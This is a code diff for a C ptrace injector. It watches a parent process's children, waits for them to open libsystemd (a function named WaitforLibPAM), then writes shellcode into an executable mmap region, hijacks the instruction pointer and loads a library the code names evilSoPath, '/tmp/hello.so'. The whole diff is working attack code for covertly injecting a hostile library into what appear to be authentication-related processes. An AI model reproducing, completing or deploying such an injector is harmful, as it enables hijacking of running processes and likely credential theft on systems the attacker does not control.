@@ -6,9 +6,9 @@
 
 int Inject_Shellcode(pid_t target_pid){
         struct user_regs_struct regs, original_regs;
-        void *malloc_addr, *dlopen_mode_addr;
-        uint8_t *remote_code_ptr;
-
+        void *malloc_addr, *dlopen_mode_addr,*mmap_addr;
+        uint8_t *remote_code_ptr,*local_code_ptr;;
+        uint32_t code_length;
 
         char evilSoPath[] = "/tmp/hello.so";
         if ( ptrace_attach( target_pid ) == -1 ){
@@ -35,7 +35,7 @@ int Inject_Shellcode(pid_t target_pid){
         void * self_malloc_addr = dlsym(handle,"malloc");
         printf("+ self libc moudle base:%p\n",libc_moudle_base);
         malloc_addr = get_remote_addr( target_pid, "libc-", (void *)self_malloc_addr );
-
+        mmap_addr = get_remote_addr( target_pid, "libc-", (void *)mmap );
 
         printf("+ remote libc path:%s\n",libc_path);
 
@@ -47,10 +47,14 @@ int Inject_Shellcode(pid_t target_pid){
 
         printf("+ remote libc_dlopen_mode addr:%p\n",dlopen_mode_addr);
         long parameters[10];
-        parameters[0] = 0x4000; // size
+        parameters[0] = 0;      // addr
+        parameters[1] = 0x4000; // size
+        parameters[2] = PROT_READ | PROT_WRITE | PROT_EXEC;  // prot
+        parameters[3] =  MAP_ANONYMOUS | MAP_PRIVATE; // flags
+        parameters[4] = 0; //fd
+        parameters[5] = 0; //offset
 
-
-        if(ptrace_call( target_pid, (uint64_t)malloc_addr, parameters, 1,&regs,0 )==-1){
+        if(ptrace_call( target_pid, (uint64_t)mmap_addr, parameters, 6,&regs,0 )==-1){
                 printf("- Writedata Error\n" );
                 return -1;
         }
@@ -69,12 +73,31 @@ int Inject_Shellcode(pid_t target_pid){
         printf("+ Writing EvilSo Path at:%p\n",remote_code_ptr);
         parameters[1] = 0x2;      // addr
         parameters[0] = remote_code_ptr; // size
-        if(ptrace_call( target_pid, (uint64_t)dlopen_mode_addr, parameters, 2,&regs,0 )==-1){
-                printf("- Called dlopen_mode_addr Error\n" );
-                return -1;
-        }
+        //if(ptrace_call( target_pid, (uint64_t)dlopen_mode_addr, parameters, 2,&regs,0 )==-1){
+          //      printf("- Called dlopen_mode_addr Error\n" );
+            //    return -1;
+        //}
 
-        printf("+ EvilSo Injected.\n+ Recorver the regsing...\n");
+        ///////////////////////////////
+        extern uint64_t _dlopen_mode_param1_s, _dlopen_mode_addr_s,_inject_start_s,_inject_end_s;
+        memcpy((void*)((long)&_dlopen_mode_param1_s+2),&remote_code_ptr,sizeof(long));
+        memcpy((void*)((long)&_dlopen_mode_addr_s+2),&dlopen_mode_addr,sizeof(long));
+
+        remote_code_ptr += strlen(evilSoPath)+1;
+        local_code_ptr = (uint8_t *)&_inject_start_s;
+        code_length = (long)&_inject_end_s - (long)&_inject_start_s;
+
+        ptrace_writedata(target_pid,remote_code_ptr,local_code_ptr,code_length ); //写入本地shellcode
+        printf("+ Writing Shellcode at:%p code length:%d\n",remote_code_ptr,code_length);
+        regs.rip = (long)remote_code_ptr;
+
+        ptrace_setregs( target_pid, &regs );
+        ptrace_continue( target_pid );
+        waitpid( target_pid, NULL, WUNTRACED  );
+
+        /////////////////////////////////
+
+        printf("+ EvilSo Injected.\n+ Recorver the regsing...\n-------------------------------\n");
         ptrace_setregs( target_pid, &original_regs );
         ptrace_continue( target_pid );
 
@@ -90,7 +113,7 @@ int WaitforLibPAM(pid_t target_pid){
         return -1;
     }
     if ( ptrace_getregs( target_pid, &regs ) == -1 ){
-        printf("-- Getregs Error\n" );
+        printf("- Getregs Error\n" );
         return -1;
     }
     //ptrace_continue( target_pid );
@@ -104,10 +127,11 @@ int WaitforLibPAM(pid_t target_pid){
             //printf("++ SubProcess: system call num = %ld\n", num);
         if(num ==257){
             ptrace_getregs( target_pid, &regs ) ;
-            printf("++ SubProcess: rsi :%p\n",regs.rsi);
+            //printf("++ [%d][openat] SubProcess: rsi :%p\n",target_pid,regs.rsi);
             ptrace_readdata(target_pid,(void *)regs.rsi,path,255);
-            printf("++ SubProcess:openat path :%s\n",path);
+            //printf("++ [%d][openat] SubProcess:openat path :%s\n",target_pid,path);
             if(strstr(path,libsystemd)){
+                printf("++ [%d][openat] SubProcess:openat find path: %s\n",target_pid,path);
                 ptrace_detach(target_pid);
                 Inject_Shellcode(target_pid);
                 break;
@@ -115,9 +139,9 @@ int WaitforLibPAM(pid_t target_pid){
         }
         if(num ==2){
             ptrace_getregs( target_pid, &regs ) ;
-            printf("++ SubProcess: rdi :%p\n",regs.rdi);
+            //printf("++[%d][open] SubProcess: rdi :%p\n",target_pid,regs.rdi);
             ptrace_readdata(target_pid,(void *)regs.rdi,path,255);
-            printf("++ SubProcess:open path :%s\n",path);
+            //printf("++[%d][open] SubProcess:open path :%s\n",target_pid,path);
             if(strstr(path,libsystemd)){
                 ptrace_detach(target_pid);
                 Inject_Shellcode(target_pid);
@@ -159,17 +183,16 @@ int main(int argc, char const *argv[])
         pthread_t id;
         num = ptrace(PTRACE_PEEKUSER, target_pid, ORIG_RAX * 8, NULL);// 获得调用号值
         if(num == 56){
-            printf("system call num = %ld\n", num);
+            //printf("system call num = %ld\n", num);
             ptrace_getregs( target_pid, &regs ); // 获得调用结果
-            printf("Process maybe = %ld \n", regs.rax);
+            printf("+ Process maybe = %ld \n", regs.rax);
             subprocess = regs.rax;
             if(subprocess > 0){
                 pthread_create(&id,NULL,(void *) WaitforLibPAM,subprocess);
             }
-            
+
         }
     }
-    
+
         return 0;
 }
-
